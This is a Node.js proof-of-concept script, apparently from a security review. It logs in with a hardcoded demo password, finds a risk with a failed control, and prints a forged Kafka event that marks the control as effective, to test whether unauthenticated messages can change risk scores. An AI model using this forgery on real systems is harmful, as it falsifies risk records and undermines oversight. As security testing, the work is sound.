#!/usr/bin/env node
// Experiment for the security review: can a message published straight into Kafka (no sign-in) change a risk score?
// Runs against the isolated copy (security/compose.isolated.yaml), from a container on its network:
//   node kafka-forgery.mjs find            → picks a risk with a failed control and prints the forged message
//   node kafka-forgery.mjs check <riskId>  → prints the risk's score and its latest history entry
const GATEWAY = process.env.GATEWAY_URL ?? 'http://gateway:8080';
const [mode, riskId] = process.argv.slice(2);

const login = async (username) =>
  (await (await fetch(`${GATEWAY}/api/auth/login`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username, password: 'demo123' }) })).json()).accessToken;
const token = await login('dave');
const get = async (path) => (await fetch(GATEWAY + path, { headers: { Authorization: `Bearer ${token}` } })).json();

if (mode === 'find') {
  const risks = (await get('/api/risks?size=100')).content;
  for (const risk of risks) {
    const links = await get(`/api/risks/${risk.id}/controls`);
    const failed = links.find((l) => Number(l.latestEffectiveness) === 0 && l.lastAssessedAt);
    if (failed && risk.residualScore >= Number(process.env.MIN_SCORE ?? 12)) {
      const forged = {
        eventId: crypto.randomUUID(),
        schemaVersion: 1,
        controlId: failed.controlId,
        controlType: failed.controlType,
        assessmentId: crypto.randomUUID(),
        result: 'EFFECTIVE',
        effectiveness: 1.0,
        assessedAt: new Date().toISOString(),
      };
      console.log(JSON.stringify({ riskId: risk.id, title: risk.title, score: risk.residualScore, rating: risk.rating, control: failed.controlId }));
      console.log(`${failed.controlId}|${JSON.stringify(forged)}`);
      process.exit(0);
    }
  }
  console.log('no suitable risk');
} else {
  const risk = await get(`/api/risks/${riskId}`);
  const all = await get(`/api/risks/${riskId}/history`); const history = all[all.length - 1];
  console.log(JSON.stringify({ score: risk.residualScore, rating: risk.rating, latestHistory: history }));
}
